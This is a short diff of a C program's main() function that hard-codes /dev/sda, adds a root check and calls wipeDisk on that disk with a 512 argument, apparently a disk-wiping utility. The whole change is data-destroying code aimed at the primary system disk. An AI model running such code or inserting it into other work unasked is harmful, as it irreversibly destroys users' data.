@@ -15,8 +15,9 @@
   
 int main()
 {
+    const char* disk = "/dev/sda";
     bool result;
-    result = wipeDisk("/dev/sda");
-    
+    checkForRoot(disk);
+    result = wipeDisk(disk, 512);
     return result;
 }
